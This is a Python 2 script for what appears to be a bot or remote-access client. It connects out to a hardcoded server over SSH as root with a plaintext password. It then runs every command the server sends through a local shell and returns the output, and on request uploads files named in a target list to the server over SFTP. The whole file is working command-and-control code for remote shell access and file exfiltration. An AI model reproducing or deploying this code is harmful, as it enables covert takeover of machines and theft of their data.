from paramiko import Transport
from paramiko import SFTPClient
from paramiko import SSHClient
from paramiko import AutoAddPolicy
from threading import  Thread
from  subprocess import Popen
from  subprocess import PIPE
from paramiko import RSAKey
import ChannelSSH
import os.path
import logging
logging.basicConfig()
duper_lp= "./path.cnf"
ip_server='192.168.43.99'
class Bot():
    def __init__(self):
        self.path_source = None
        self.path_destination = None
        self.chan = None
        self.tags = None


    def getOutputCmd(self,cmd):
        # do shell command
        try:
            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            # read output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            return stdout_value
        except:
            pass

    def sftp_authentication(self):
        try:
            transport = Transport((ip_server, 222))
            privatekeyfile = os.path.expanduser('./bot_keys/id_rsa')
            mykey = RSAKey.from_private_key_file(privatekeyfile)
            transport.connect(username='bot', pkey=mykey)
            sftp_client = SFTPClient.from_transport(transport)
            return  sftp_client, transport
        except Exception, e:
            print "SFTP Authentication Fail:"+str(e)

    def dump_db(self):
        try:
            fileserro=0
            msgerror=""
            sftp_client, transport = self.sftp_authentication()
            with open(duper_lp) as f:
                content = f.readlines()
            # to remove whitespace characters like `\n` at the end of each line
            for line in content:
                line=line.strip()
                if os.path.isfile(line):
                    sftp_client.put(line,self.path_destination+self.tags+'_'+os.path.basename(line))
                else:
                    msgerror+="-- le fichier "+str(line)+" n'existe pas !! \n"
            sftp_client.close()
            transport.close()
            ChannelSSH.sendToChannel("[*] End of dumping files "+"\n"+msgerror, self.chan)
        except Exception, e:
            print "Fct:Dumper file export: " + str(e)
    def get_dumper_file(self):
        try:
            sftp_client, transport = self.sftp_authentication()
            # should verify if file duper_lp exist, create it else
            sftp_client.get(self.path_source, duper_lp, callback=None)
            sftp_client.close()
            transport.close()
        except Exception, e:
            print "Fct:Dumper file import: "+str(e)


    def connect(self):
        subRoot = None
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(ip_server,port=2222, username='root', password='thetoorpassword')
        self.chan = client.get_transport().open_session()
        while True:
            command = ChannelSSH.receiveFromChannel(self.chan)
            if 'deconnect' == command:
                ChannelSSH.closeChannel(self.chan)
                break
            elif 'dump' == command:
                Thread(target=self.dump_db).start()
            elif '**LOADPATH**' in command:
                inita, path_d,tags,path_s = command.split(';')
                self.path_source = path_s
                self.path_destination = path_d
                self.tags = tags
                self.get_dumper_file()
            else:
                ChannelSSH.sendToChannel(self.getOutputCmd(command),self.chan)


if __name__ == '__main__':
    bot = Bot()
    bot.connect()